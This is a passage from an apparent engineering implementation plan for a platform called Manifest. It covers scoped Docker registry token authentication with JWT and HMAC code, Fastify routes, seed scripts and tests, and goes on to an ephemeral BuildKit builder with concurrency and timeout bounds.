    expect(verifyBuildCredential(SECRET, c.username, c.password)).toBeUndefined()
  })

  it('refuses a credential signed with a different secret', () => {
    const c = cred('local/chem-labs', Date.now() + 60_000)
    expect(verifyBuildCredential('t'.repeat(32), c.username, c.password)).toBeUndefined()
  })
})
```

- [ ] **Step 3: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/registry-auth
```

Expected: FAIL — `Cannot find module './registry-auth.js'`.

- [ ] **Step 4: Write the issuer**

`packages/control-plane/src/runtime/docker/registry-auth.ts`:

```ts
import { createHmac, createSign, randomUUID, timingSafeEqual } from 'node:crypto'

export interface Grant {
  type: string
  name: string
  actions: string[]
}

const b64u = (input: string | Buffer): string => Buffer.from(input).toString('base64url')

/**
 * `scope` arrives as ONE space-separated field, not as repeated parameters. A parser
 * that reads only the first entry silently drops the push scope, and the build then
 * fails with an authorization error that reads like a policy decision.
 */
export function parseScopeStrings(raw: readonly string[]): Grant[] {
  const out: Grant[] = []
  for (const field of raw) {
    for (const one of field.split(' ')) {
      if (one === '') continue
      const parts = one.split(':')
      if (parts.length < 3) continue
      out.push({
        type: parts[0],
        // A repository name may contain slashes but never a colon, so everything
        // between the first and last colon is the name.
        name: parts.slice(1, -1).join(':'),
        actions: parts[parts.length - 1].split(',').filter((a) => a !== ''),
      })
    }
  }
  return out
}

/**
 * §13, as a function. The builder may push to exactly its own app repository, may
 * pull the platform mirrored base images, and gets nothing anywhere else. Grants are
 * TRIMMED rather than refused, because buildx asks for `pull,push` on base images it
 * only reads and refusing outright would break every build.
 */
export function applyGrantPolicy(
  authorizedRepository: string,
  requested: readonly Grant[],
): Grant[] {
  return requested.map((grant) => {
    if (grant.type !== 'repository') return { ...grant, actions: [] }
    if (grant.name === authorizedRepository) return { ...grant }
    if (grant.name.startsWith('base/')) {
      return { ...grant, actions: grant.actions.filter((a) => a === 'pull') }
    }
    return { ...grant, actions: [] }
  })
}

export function mintRegistryToken(
  keyPem: string,
  certPem: string,
  input: { issuer: string; service: string; subject: string; access: Grant[]; ttlSeconds?: number },
): string {
  const now = Math.floor(Date.now() / 1000)
  const ttl = input.ttlSeconds ?? 300
  // x5c carries the DER body of the PEM. registry:2 validates the chain against
  // REGISTRY_AUTH_TOKEN_ROOTCERTBUNDLE; there is no key registration step.
  const x5c = [certPem.replace(/-----(BEGIN|END) CERTIFICATE-----|\s/g, '')]
  const header = { typ: 'JWT', alg: 'RS256', x5c }
  const claims = {
    iss: input.issuer,
    sub: input.subject,
    aud: input.service,
    exp: now + ttl,
    nbf: now - 10,
    iat: now,
    jti: randomUUID(),
    access: input.access,
  }
  const signing = `${b64u(JSON.stringify(header))}.${b64u(JSON.stringify(claims))}`
  const signature = createSign('RSA-SHA256').update(signing).end().sign(keyPem)
  return `${signing}.${b64u(signature)}`
}

/**
 * The credential the control plane hands its own buildx child process. Short-lived
 * and unforgeable, so the token endpoint can be reachable from the host without
 * becoming a way to mint a push token for an arbitrary repository.
 */
export function issueBuildCredential(
  secret: string,
  input: { repository: string; buildId: string; expiresAt: number },
): { username: string; password: string } {
  const body = `${input.buildId}.${input.expiresAt}`
  const mac = createHmac('sha256', secret).update(`${input.repository}.${body}`).digest('hex')
  return { username: input.repository, password: `${body}.${mac}` }
}

export function verifyBuildCredential(
  secret: string,
  username: string,
  password: string,
  now: number = Date.now(),
): { repository: string } | undefined {
  const [buildId, expiresAt, mac] = password.split('.')
  if (!buildId || !expiresAt || !mac) return undefined
  if (Number(expiresAt) <= now) return undefined
  const expected = createHmac('sha256', secret)
    .update(`${username}.${buildId}.${expiresAt}`)
    .digest('hex')
  const a = Buffer.from(expected)
  const b = Buffer.from(mac)
  if (a.length !== b.length || !timingSafeEqual(a, b)) return undefined
  return { repository: username }
}
```

- [ ] **Step 5: Write the realm route**

`packages/control-plane/src/api/routes/registry-token.ts`:

```ts
import type { FastifyPluginAsync } from 'fastify'
import {
  applyGrantPolicy, mintRegistryToken, parseScopeStrings, verifyBuildCredential,
} from '../../runtime/index.js'

export interface RegistryTokenDeps {
  keyPem: string
  certPem: string
  issuer: string
  service: string
  buildCredentialSecret: string
}

/**
 * The realm `registry:2` advertises. Deliberately NOT behind the session hook: its
 * caller is a build tool, and its credential is the short-lived build credential
 * verified below rather than a Manifest session.
 */
export const registryTokenRoutes =
  (deps: RegistryTokenDeps): FastifyPluginAsync =>
  async (app) => {
    const issue = (scopes: string[], username: string, password: string) => {
      const verified = verifyBuildCredential(deps.buildCredentialSecret, username, password)
      // An unverifiable credential is granted NOTHING rather than refused with a
      // 401. registry:2 turns an empty grant into the same `insufficient_scope` the
      // client already knows how to report, whereas a 401 from the realm makes the
      // client retry the realm in a loop.
      const authorized = verified?.repository ?? '!no-such-repository'
      const access = applyGrantPolicy(authorized, parseScopeStrings(scopes))
      const token = mintRegistryToken(deps.keyPem, deps.certPem, {
        issuer: deps.issuer,
        service: deps.service,
        subject: verified?.repository ?? 'anonymous',
        access,
      })
      return { token, access_token: token, expires_in: 300, issued_at: new Date().toISOString() }
    }

    // `idempotency: 'exempt'` is NOT optional here, and it is not decoration.
    // P2's server applies D23.6 to every mutating route through a preHandler hook:
    // a POST with no `Idempotency-Key` header of at least 8 characters is refused
    // with 400 IDEMPOTENCY_KEY_REQUIRED. BuildKit and the Docker daemon will never
    // send that header — they are speaking the distribution token protocol, not
    // Manifest's API — so without this the builder cannot get a token at all, and
    // the symptom is a 400 from a route that looks correctly implemented.
    // Minting a token is also not a domain mutation; it is authentication, which
    // is exactly why P2 exempts `/auth/*` the same way.
    //
    // The form Docker 29 and BuildKit actually use. Everything is in the body.
    app.post('/internal/registry/token', { config: { idempotency: 'exempt' } }, async (request) => {
      const body = (request.body ?? {}) as Record<string, string>
      return issue(body.scope === undefined ? [] : [body.scope], body.username ?? '', body.password ?? '')
    })

    // The GET + Basic form. In the distribution spec and used by other clients;
    // NOT observed in use by anything in this platform. Ten lines, and its absence
    // would be a silent incompatibility rather than a visible one.
    app.get('/internal/registry/token', async (request) => {
      const query = request.query as { scope?: string | string[] }
      const scopes = query.scope === undefined ? [] : [query.scope].flat()
      const basic = Buffer.from(
        (request.headers.authorization ?? '').replace(/^Basic /i, ''),
        'base64',
      ).toString()
      const index = basic.indexOf(':')
      return issue(scopes, basic.slice(0, index), basic.slice(index + 1))
    })
  }
```

**These two routes must also be added to P2's authorization contract table.** P2
Task 20 ships a drift guard — *"covers every route the server registers"* — that
compares `app.registeredRoutes` against the `ROUTES` array in
`packages/control-plane/src/api/authz-contract.ts` and fails naming any route nobody
decided the authorization for. Registering these without touching that table **fails
the build**, and that is the guard working: these endpoints mint registry push
credentials, so their authorization is a decision, not an oversight.

They are unlike every other route in the table: they carry **no session**, they
authenticate with the build credential in the request itself, and `requireActor` is
never called. So every actor — including `anonymous` — expects `'pass'`, and the
authorization that matters is the credential check inside `issue()`, which
`registry-auth.test.ts` covers. Add to `ROUTES`:

```ts
  {
    // No session: authenticated by the build credential in the request body, which
    // is why every actor passes here and the real check lives in registry-auth.ts.
    method: 'POST', url: '/internal/registry/token',
    request: () => ({ url: '/internal/registry/token', payload: { scope: '', username: '', password: '' } }),
    expect: { owner: 'pass', collaborator: 'pass', stranger: 'pass', admin: 'pass', anonymous: 'pass' },
  },
  {
    method: 'GET', url: '/internal/registry/token',
    request: () => ({ url: '/internal/registry/token' }),
    expect: { owner: 'pass', collaborator: 'pass', stranger: 'pass', admin: 'pass', anonymous: 'pass' },
  },
```

**Watch the guard fail first.** Register the routes, run
`pnpm --filter @manifest/control-plane test src/api/authz-contract`, and confirm it
reports `expected [ 'POST /internal/registry/token', 'GET /internal/registry/token' ]
to deeply equal []` before adding the rows. A completeness guard you have never seen
fail is a completeness guard you are trusting on faith.

Register it in `api/server.ts` beside the other route plugins, and make sure Fastify
parses `application/x-www-form-urlencoded` — the POST body arrives form-encoded, and
Fastify does **not** parse that content type by default. Without the parser
`request.body` is `undefined`, every grant is empty, and the symptom is a scope
refusal on a correct credential.

- [ ] **Step 6: Turn on token auth in the registry**

In `infra/compose.yaml`, the `registry` service gains:

```yaml
    environment:
      REGISTRY_AUTH: token
      # The control plane, on the host. Measured: the buildx CLIENT performs this
      # exchange, so the realm never has to be reachable from the internal build
      # network (S1-controls-settled.md, finding 2).
      REGISTRY_AUTH_TOKEN_REALM: http://127.0.0.1:7100/internal/registry/token
      REGISTRY_AUTH_TOKEN_SERVICE: manifest-registry
      REGISTRY_AUTH_TOKEN_ISSUER: manifest-control-plane
      REGISTRY_AUTH_TOKEN_ROOTCERTBUNDLE: /certs/token.crt
      # Task 17's offline control removes a mirrored base image to prove the build
      # genuinely depends on it. Without this the DELETE answers 405, nothing is
      # removed, the build succeeds, and the control silently proves nothing.
      REGISTRY_STORAGE_DELETE_ENABLED: "true"
    volumes:
      - registry-data:/var/lib/registry
      - ./registry-auth/token.crt:/certs/token.crt:ro
```

In `infra/seed/seed.sh`, before the image mirroring step:

```bash
# The registry token issuer. Generated once; the private half never leaves this
# machine and is gitignored. The registry validates against the certificate half.
if [ ! -f infra/registry-auth/token.key ]; then
  mkdir -p infra/registry-auth
  openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
    -keyout infra/registry-auth/token.key \
    -out    infra/registry-auth/token.crt \
    -subj "/CN=manifest-control-plane" 2>/dev/null
  chmod 600 infra/registry-auth/token.key
  echo "  generated infra/registry-auth/token.{key,crt}"
fi
```

Add `infra/registry-auth/` to `.gitignore`.

`infra/seed/mint-token.mjs` — seed needs its own scoped token, because the registry it
pushes base images into now requires one:

```js
// `make seed` pushes base images into a registry that now requires a token, and it
// cannot use `docker login`: there is no password to type and the realm is the
// control plane, which is not running during `make seed`. A pre-minted bearer token
// in a throwaway docker config is the supported path.
// Usage: node infra/seed/mint-token.mjs base/node
import { createSign, randomUUID } from 'node:crypto'
import { readFileSync } from 'node:fs'

const repository = process.argv[2]
if (!repository) {
  console.error('usage: mint-token.mjs <repository>')
  process.exit(2)
}
const key = readFileSync('infra/registry-auth/token.key', 'utf8')
const cert = readFileSync('infra/registry-auth/token.crt', 'utf8')
const b64u = (v) => Buffer.from(v).toString('base64url')
const now = Math.floor(Date.now() / 1000)
const header = {
  typ: 'JWT',
  alg: 'RS256',
  x5c: [cert.replace(/-----(BEGIN|END) CERTIFICATE-----|\s/g, '')],
}
const claims = {
  iss: 'manifest-control-plane', sub: 'make-seed', aud: 'manifest-registry',
  exp: now + 900, nbf: now - 10, iat: now, jti: randomUUID(),
  access: [{ type: 'repository', name: repository, actions: ['pull', 'push'] }],
}
const signing = `${b64u(JSON.stringify(header))}.${b64u(JSON.stringify(claims))}`
process.stdout.write(`${signing}.${b64u(createSign('RSA-SHA256').update(signing).end().sign(key))}`)
```

In `infra/seed/mirror-images.sh`, replace the bare `docker push` with:

```bash
SEED_DOCKER_CONFIG="${PWD}/infra/seed-cache/dockercfg"
mkdir -p "${SEED_DOCKER_CONFIG}"
TOKEN=$(node infra/seed/mint-token.mjs "base/${short}")
printf '{"auths":{"127.0.0.1:7107":{"registrytoken":"%s"}}}\n' "$TOKEN" \
  > "${SEED_DOCKER_CONFIG}/config.json"
DOCKER_CONFIG="${SEED_DOCKER_CONFIG}" docker push "127.0.0.1:7107/base/${short}:${tag}"
```

In `scripts/verify.sh`, the registry check changes from *"answers 200"* to the
stronger assertion — a registry that still answers `200` anonymously has no auth:

```bash
registry_requires_a_token() {
  local out
  out=$(curl -sS -i -m 6 "http://127.0.0.1:$PORT_REGISTRY/v2/" | tr -d '\r')
  echo "$out" | head -1
  echo "$out" | grep -qi '^HTTP/1.1 401' &&
  echo "$out" | grep -qi '^Www-Authenticate: Bearer realm='
}
check "the registry refuses an anonymous request and advertises its realm"  registry_requires_a_token
```

- [ ] **Step 7: Write the Docker-tier test — the control, end to end**

`packages/control-plane/src/runtime/docker/registry-auth.docker.test.ts`:

```ts
import { execFile } from 'node:child_process'
import { mkdtempSync, symlinkSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import { promisify } from 'node:util'
import { expect, it } from 'vitest'
import { describeDocker } from './docker-tier.js'

const run = promisify(execFile)

/**
 * A docker config carrying a pre-minted bearer token. NOTE the cli-plugins symlink:
 * setting DOCKER_CONFIG moves CLI plugin discovery with it, and without this line
 * `docker buildx` fails with `unknown flag: --builder`, which reads as a buildx
 * version problem and is not one.
 */
function dockerConfigWith(token: string): string {
  const dir = mkdtempSync(join(tmpdir(), 'mf-dockercfg-'))
  writeFileSync(
    join(dir, 'config.json'),
    JSON.stringify({ auths: { '127.0.0.1:7107': { registrytoken: token } } }),
  )
  symlinkSync(join(homedir(), '.docker', 'cli-plugins'), join(dir, 'cli-plugins'))
  return dir
}

const mintFor = async (repository: string): Promise<string> =>
  (await run('node', ['infra/seed/mint-token.mjs', repository])).stdout

describeDocker('registry push scoping (§13)', () => {
  it('accepts a push to the repository the token names', async () => {
    const config = dockerConfigWith(await mintFor('local/scopetest'))
    await run('docker', ['tag', 'alpine:3.22', '127.0.0.1:7107/local/scopetest:probe'])
    await expect(
      run('docker', ['push', '127.0.0.1:7107/local/scopetest:probe'], {
        env: { ...process.env, DOCKER_CONFIG: config },
      }),
    ).resolves.toBeTruthy()
  })

  // THE CONTROL. Same credential, different repository path.
  it('REFUSES a push to any other repository with the same token', async () => {
    const config = dockerConfigWith(await mintFor('local/scopetest'))
    await run('docker', ['tag', 'alpine:3.22', '127.0.0.1:7107/local/someone-else:probe'])
    await expect(
      run('docker', ['push', '127.0.0.1:7107/local/someone-else:probe'], {
        env: { ...process.env, DOCKER_CONFIG: config },
      }),
    ).rejects.toThrow(/insufficient_scope|authorization failed|denied/)
  })

  it('REFUSES an anonymous push', async () => {
    const config = mkdtempSync(join(tmpdir(), 'mf-empty-cfg-'))
    writeFileSync(join(config, 'config.json'), '{}')
    await expect(
      run('docker', ['push', '127.0.0.1:7107/local/scopetest:probe'], {
        env: { ...process.env, DOCKER_CONFIG: config },
      }),
    ).rejects.toThrow()
  })

  it('leaves no trace of the refused repository in the registry', async () => {
    const config = dockerConfigWith(await mintFor('local/scopetest'))
    const { stdout } = await run(
      'curl',
      ['-sS', '-H', `Authorization: Bearer ${await mintFor('local/scopetest')}`,
       'http://127.0.0.1:7107/v2/local/someone-else/tags/list'],
      { env: { ...process.env, DOCKER_CONFIG: config } },
    )
    expect(stdout).toMatch(/UNAUTHORIZED|NAME_UNKNOWN/)
  })
})
```

- [ ] **Step 8: Run everything**

```bash
make seed && make up
pnpm test && pnpm test:docker && make verify
```

Expected: 13 unit tests and 4 Docker tests green, `make verify` green with the
stronger registry check, and
`curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:7107/v2/` answering **401**.

- [ ] **Step 9: Prove the policy is what refuses**

In `applyGrantPolicy`, change the final `return { ...grant, actions: [] }` to
`return { ...grant }`.

Expected: **FAIL** on *"grants NOTHING on another project repository"* (unit) and
*"REFUSES a push to any other repository with the same token"* (Docker). Restore.

Then the signature control: change `mintRegistryToken` to sign with a freshly
generated key rather than `keyPem`, and re-run the Docker tier.

Expected: **FAIL** on all four registry tests — the registry rejects every token.
Restore.

**Do not attempt the signature control by editing characters in the token.** The last
base64url character of an RS256 signature carries four padding bits, so changing it
leaves the decoded signature byte-identical and the registry accepts it — which reads
as "the signature is not verified" and is the opposite of the truth.

- [ ] **Step 10: Commit**

```bash
git add packages/control-plane/src/runtime/docker/registry-auth.ts \
        packages/control-plane/src/runtime/docker/registry-auth.test.ts \
        packages/control-plane/src/runtime/docker/registry-auth.docker.test.ts \
        packages/control-plane/src/runtime/docker/testing.ts \
        packages/control-plane/src/runtime/docker/__fixtures__/ \
        packages/control-plane/src/api/routes/registry-token.ts \
        packages/control-plane/src/api/server.ts \
        infra/ scripts/verify.sh .gitignore
git commit -m "feat(runtime): repository-scoped registry push tokens (§13 gate integrity)

registry:2 does token auth against an issuer the control plane runs. Verified by
pushing with a scoped credential and watching the same credential refused on a
different repository path."
```

---

## Task 10: The ephemeral builder, and the three bounds §12 calls "Bounded"

**Files:**
- Create: `packages/control-plane/src/runtime/docker/builder.ts`
- Create: `packages/control-plane/src/runtime/docker/concurrency.ts`
- Test: `packages/control-plane/src/runtime/docker/concurrency.test.ts`
- Test: `packages/control-plane/src/runtime/docker/builder.test.ts`
- Test: `packages/control-plane/src/runtime/docker/builder.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient` (Task 1); `issueBuildCredential` (Task 9).
- Produces:
  - `interface BuildLimits { timeoutMs: number; maxUsedSpace: string; maxParallelism: number; globalConcurrency: number; perProjectConcurrency: number }`
  - `DEFAULT_BUILD_LIMITS: BuildLimits`
  - `buildkitdToml(limits: BuildLimits, registryHost: string): string`
  - `createBuildQueue(limits): { run<T>(projectSlug: string, fn: () => Promise<T>): Promise<T>; inFlight(): number }`
  - `withEphemeralBuilder(engine, buildId, limits, fn): Promise<T>`
  - `runBuildxBuild(input): Promise<{ digest: string; log: string }>`

**§12 says the builder is "Bounded: build timeout, disk quota, and a concurrency cap
per project and globally." Those are three different mechanisms and only two of them
are BuildKit's.** All three numbers below were measured; see
[`../spikes/S1-controls-settled.md`](../spikes/S1-controls-settled.md).

| Bound | Enforced by | Evidence |
|---|---|---|
| **Steps in flight inside one build** | `max-parallelism` in `buildkitd.toml` | two 25-second builds: 2 RUN steps in flight and 25 s wall clock by default, **1 step and 50 s** at `max-parallelism = 1` |
| **Cache size between builds** | `[[worker.oci.gcpolicy]] maxUsedSpace` | a build wrote 300 MB against a 128 MB policy: cache reached **328 MB**, and GC reclaimed it to **13.6 MB within ~20 s** |
| **A single build's disk** | **nothing, on this driver** | `--storage-opt size=64M` is accepted, recorded in `HostConfig`, and a 128 MB write succeeds. Reported as `enforcesDiskQuota: false` (Task 3) |
| **Build timeout** | **destroying the builder** | BuildKit has no timeout setting anywhere: not in `buildkitd.toml`, not as a buildx flag. The only cancellation is the client's, over a session that dies with the client |
| **Builds at once, per project and globally** | **the control plane** | `max-parallelism` is per-daemon, and §12 makes the builder ephemeral per build — so a daemon setting bounds only the build that owns it |

**Why the timeout is `docker rm -f` and not a client deadline.** A client deadline is
the fast path and usually gets there first. It is not a *bound*, because it needs the
control plane to still be alive to send it — and once, during the probe, a cancelled
build left its `RUN` process alive for minutes while three later builds of the same
Dockerfile **attached to that abandoned solve** instead of starting their own
(BuildKit deduplicates identical in-flight vertexes, and `--no-cache` disables cache
*lookup*, not that deduplication). That incident was not reproducible. The design does
not depend on it being: an ephemeral builder destroyed in a `finally` is immune by
construction, and §12 already requires one.

**The builder holds no control-plane credential** (§12, D13). It gets a source tree, a
blueprint-generated Dockerfile, and — through the buildx client on the host, never
through the builder itself — a registry token scoped to one repository path.

- [ ] **Step 1: Write the failing concurrency test**

`packages/control-plane/src/runtime/docker/concurrency.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { createBuildQueue } from './concurrency.js'

const deferred = () => {
  let release: () => void = () => {}
  const promise = new Promise<void>((resolve) => (release = resolve))
  return { promise, release }
}

describe('build concurrency (§12, §20 availability)', () => {
  it('runs up to the global limit at once', async () => {
    const queue = createBuildQueue({ globalConcurrency: 2, perProjectConcurrency: 2 })
    const gates = [deferred(), deferred(), deferred()]
    const runs = gates.map((gate, index) =>
      queue.run(`project-${index}`, async () => {
        await gate.promise
        return index
      }),
    )
    await new Promise((r) => setTimeout(r, 10))
    expect(queue.inFlight()).toBe(2)
    gates.forEach((g) => g.release())
    expect(await Promise.all(runs)).toEqual([0, 1, 2])
  })

  // §20: "Build concurrency is bounded per project and globally." Per project is
  // the half that stops one project starving every other one on a laptop.
  it('bounds one project even when the global budget is free', async () => {
    const queue = createBuildQueue({ globalConcurrency: 8, perProjectConcurrency: 1 })
    const gates = [deferred(), deferred()]
    const runs = gates.map((gate) => queue.run('chem-labs', async () => { await gate.promise }))
    await new Promise((r) => setTimeout(r, 10))
    expect(queue.inFlight()).toBe(1)
    gates.forEach((g) => g.release())
    await Promise.all(runs)
  })

  it('releases the slot when the build throws', async () => {
    const queue = createBuildQueue({ globalConcurrency: 1, perProjectConcurrency: 1 })
    await expect(queue.run('p', async () => { throw new Error('boom') })).rejects.toThrow('boom')
    expect(queue.inFlight()).toBe(0)
    await expect(queue.run('p', async () => 'ok')).resolves.toBe('ok')
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/concurrency
```

Expected: FAIL — `Cannot find module './concurrency.js'`.

- [ ] **Step 3: Write the queue**

`packages/control-plane/src/runtime/docker/concurrency.ts`:

```ts
/**
 * §12's "concurrency cap per project and globally". It lives here, in the control
 * plane, and not in `buildkitd.toml`, because §12 also makes the builder ephemeral
 * per build: a daemon-level `max-parallelism` bounds only the build that owns that
 * daemon. This bounds how many daemons exist at once.
 */
export interface ConcurrencyLimits {
  globalConcurrency: number
  perProjectConcurrency: number
}

export function createBuildQueue(limits: ConcurrencyLimits): {
  run<T>(projectSlug: string, fn: () => Promise<T>): Promise<T>
  inFlight(): number
} {
  let global = 0
  const perProject = new Map<string, number>()
  const waiting: (() => void)[] = []

  const canStart = (slug: string) =>
    global < limits.globalConcurrency &&
    (perProject.get(slug) ?? 0) < limits.perProjectConcurrency

  const acquire = async (slug: string): Promise<void> => {
    while (!canStart(slug)) {
      await new Promise<void>((resolve) => waiting.push(resolve))
    }
    global += 1
    perProject.set(slug, (perProject.get(slug) ?? 0) + 1)
  }

  const release = (slug: string): void => {
    global -= 1
    perProject.set(slug, (perProject.get(slug) ?? 1) - 1)
    // Wake everyone and let each re-check: a waiter blocked on its PROJECT limit
    // must not consume the wake-up that a waiter blocked on the GLOBAL limit needs.
    const woken = waiting.splice(0, waiting.length)
    for (const wake of woken) wake()
  }

  return {
    async run(projectSlug, fn) {
      await acquire(projectSlug)
      try {
        return await fn()
      } finally {
        release(projectSlug)
      }
    },
    inFlight: () => global,
  }
}
```

- [ ] **Step 4: Write the failing builder-config test**

`packages/control-plane/src/runtime/docker/builder.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { DEFAULT_BUILD_LIMITS, buildkitdToml } from './builder.js'

describe('buildkitd configuration', () => {
  const toml = buildkitdToml(DEFAULT_BUILD_LIMITS, 'manifest-registry:5000')

  // BOTH stanzas are required and NEITHER is discoverable from the error message
  // it prevents (S1). Without [dns], `RUN npm install` fails with
  // `getaddrinfo ENOTFOUND manifest-verdaccio`, because BuildKit writes its own
  // resolv.conf for RUN steps.
  it('points RUN steps at Docker\'s embedded resolver', () => {
    expect(toml).toContain('[dns]')
    expect(toml).toContain('nameservers = ["127.0.0.11"]')
  })

  it('marks the local registry as plain HTTP, or offline builds cannot pull the mirrored base image', () => {
    expect(toml).toContain('[registry."manifest-registry:5000"]')
    expect(toml).toContain('http = true')
    expect(toml).toContain('insecure = true')
  })

  it('bounds steps in flight and cache size — the two bounds BuildKit does enforce', () => {
    expect(toml).toContain('max-parallelism = 4')
    expect(toml).toContain('gc = true')
    expect(toml).toContain('maxUsedSpace = "4GB"')
  })

  it('has no timeout setting, because BuildKit has none', () => {
    expect(toml).not.toMatch(/timeout/i)
    // The timeout is the ephemeral builder's lifetime instead.
    expect(DEFAULT_BUILD_LIMITS.timeoutMs).toBe(900_000)
  })
})
```

- [ ] **Step 5: Write the builder**

`packages/control-plane/src/runtime/docker/builder.ts`:

```ts
import { execFile } from 'node:child_process'
import { mkdtemp, readFile, symlink, writeFile } from 'node:fs/promises'
import { homedir, tmpdir } from 'node:os'
import { join } from 'node:path'
import type { EngineClient } from './engine.js'
import { EngineError } from './engine.js'
import type { ConcurrencyLimits } from './concurrency.js'

export interface BuildLimits extends ConcurrencyLimits {
  /** Enforced by destroying the builder. BuildKit has no timeout of its own. */
  timeoutMs: number
  /** `[[worker.oci.gcpolicy]] maxUsedSpace`. Reclaims the cache AFTER a build. */
  maxUsedSpace: string
  /** `max-parallelism`. Bounds steps in flight inside this build. */
  maxParallelism: number
}

export const DEFAULT_BUILD_LIMITS: BuildLimits = {
  // 15 minutes. §21 budgets ~0.5 GB per app environment on a 16 GB laptop; a build
  // that has not finished in fifteen minutes is stuck, not slow.
  timeoutMs: 900_000,
  maxUsedSpace: '4GB',
  // Half of a 12-core machine, so a build cannot make the rest of the platform
  // unresponsive. Measured to work: at 1 it serializes two builds from 25 s to 50 s.
  maxParallelism: 4,
  globalConcurrency: 2,
  perProjectConcurrency: 1,
}

export function buildkitdToml(limits: BuildLimits, registryHost: string): string {
  return [
    '# Generated per build by the Manifest Docker driver.',
    '',
    '# BuildKit writes its own resolv.conf for RUN steps, so Docker service names do',
    '# not resolve without this. The symptom is npm reporting',
    '#   getaddrinfo ENOTFOUND manifest-verdaccio',
    '[dns]',
    '  nameservers = ["127.0.0.11"]',
    '',
    '# The local registry is plain HTTP. Without this the builder refuses the',
    '# mirrored base images `make seed` pushed, and offline builds fail.',
    `[registry."${registryHost}"]`,
    '  http = true',
    '  insecure = true',
    '',
    '[worker.oci]',
    `  max-parallelism = ${limits.maxParallelism}`,
    '  gc = true',
    '  [[worker.oci.gcpolicy]]',
    '    all = true',
    `    maxUsedSpace = "${limits.maxUsedSpace}"`,
    '',
  ].join('\n')
}

const builderName = (buildId: string) => `mf-builder-${buildId}`

/**
 * §12: ephemeral per build, created and destroyed by the driver. The `finally` is
 * the build timeout — BuildKit has none, and a client-side deadline needs the
 * control plane to be alive to send it.
 */
export async function withEphemeralBuilder<T>(
  engine: EngineClient,
  buildId: string,
  limits: BuildLimits,
  fn: (builder: string) => Promise<T>,
): Promise<T> {
  const name = builderName(buildId)
  const toml = buildkitdToml(limits, 'manifest-registry:5000')
  await engine.del(`/containers/${name}?force=true&v=true`)
  await engine.post(`/containers/create?name=${name}`, {
    Image: 'moby/buildkit:v0.32.2-rootless',
    // The config is written from inside the container: the control plane is a host
    // process and the daemon runs in a VM, so a host bind mount is not guaranteed
    // to be visible. Same reasoning as the per-app egress proxy.
    Entrypoint: ['/bin/sh', '-c'],
    Cmd: [
      'mkdir -p /home/user/.config/buildkit && ' +
        'printf "%s" "$BUILDKITD_TOML" > /home/user/.config/buildkit/buildkitd.toml && ' +
        // Default unix socket ONLY. `--addr tcp://...` makes the
        // docker-container:// transport hang on "waiting for connection" (S1).
        'exec buildkitd --oci-worker-no-process-sandbox',
    ],
    Env: [`BUILDKITD_TOML=${toml}`],
    HostConfig: {
      // INTERNAL NETWORK ONLY. This is the network restriction §12 and §20 call a
      // control; the registry and mirror are dual-homed so they stay reachable.
      NetworkMode: 'manifest-build-internal',
      // Rootless BuildKit needs exactly these three. It does NOT need --privileged,
      // and §12 forbids it — buildx's own docker-container driver would add it.
      SecurityOpt: ['seccomp=unconfined', 'apparmor=unconfined'],
      Devices: [{ PathOnHost: '/dev/fuse', PathInContainer: '/dev/fuse', CgroupPermissions: 'rwm' }],
      Privileged: false,
      RestartPolicy: { Name: 'no' },
    },
    Labels: { 'manifest.build': buildId },
  })
  await engine.post(`/containers/${name}/start`)
  try {
    return await fn(name)
  } finally {
    // The bound. Not best-effort cleanup: this is what stops a runaway build.
    await engine.del(`/containers/${name}?force=true&v=true`)
  }
}

export interface BuildxInput {
  builder: string
  contextDir: string
  imageRef: string
  registryToken: string
  registryHost: string
  timeoutMs: number
}

/**
 * Shells out to buildx (Decision 2). `--metadata-file` is the only source of
 * `containerimage.digest`, which is what §13 binds an approval to.
 *
 * NOTE the cli-plugins symlink. Setting DOCKER_CONFIG moves CLI plugin discovery
 * with it, so without it `docker buildx` fails with `unknown flag: --builder` —
 * which reads as a buildx version problem and is not one.
 */
export async function runBuildxBuild(input: BuildxInput): Promise<{ digest: string; log: string }> {
  const configDir = await mkdtemp(join(tmpdir(), 'mf-buildcfg-'))
  await writeFile(
    join(configDir, 'config.json'),
    JSON.stringify({ auths: { [input.registryHost]: { registrytoken: input.registryToken } } }),
  )
  await symlink(join(homedir(), '.docker', 'cli-plugins'), join(configDir, 'cli-plugins'))
  const metadataFile = join(configDir, 'metadata.json')

  await new Promise<void>((resolve, reject) => {
    const child = execFile(
      'docker',
      [
        'buildx', 'create', '--name', input.builder, '--driver', 'remote',
        `docker-container://${input.builder}`,
      ],
      { env: { ...process.env, DOCKER_CONFIG: configDir } },
      (error) => (error ? reject(error) : resolve()),
    )
    child.on('error', reject)
  })

  const log = await new Promise<string>((resolve, reject) => {
    const child = execFile(
      'docker',
      [
        'buildx', '--builder', input.builder, 'build', '--push',
        '-t', input.imageRef, '--metadata-file', metadataFile, input.contextDir,
      ],
      { env: { ...process.env, DOCKER_CONFIG: configDir }, timeout: input.timeoutMs, maxBuffer: 32 * 1024 * 1024 },
      (error, stdout, stderr) =>
        error
          ? reject(
              new EngineError(
                'BUILD_FAILED',
                `build failed: ${stderr || stdout || error.message}`,
                'The message is BuildKit\'s. Check the blueprint Dockerfile, the lockfile and the mirror first.',
              ),
            )
          : resolve(`${stdout}\n${stderr}`),
    )
    child.on('error', reject)
  })

  const metadata = JSON.parse(await readFile(metadataFile, 'utf8')) as {
    'containerimage.digest'?: string
  }
  const digest = metadata['containerimage.digest']
  if (digest === undefined) {
    throw new EngineError(
      'BUILD_NO_DIGEST',
      'the build produced no containerimage.digest',
      'A build without a digest cannot become a Release (§13). Check that --push was used: ' +
        'the digest is only produced when the image is pushed.',
    )
  }
  return { digest, log }
}
```

- [ ] **Step 6: Write the Docker-tier test**

`packages/control-plane/src/runtime/docker/builder.docker.test.ts`:

```ts
import { mkdtempSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { afterAll, expect, it } from 'vitest'
import { createEngineClient, resolveSocketPath } from './engine.js'
import { describeDocker } from './docker-tier.js'
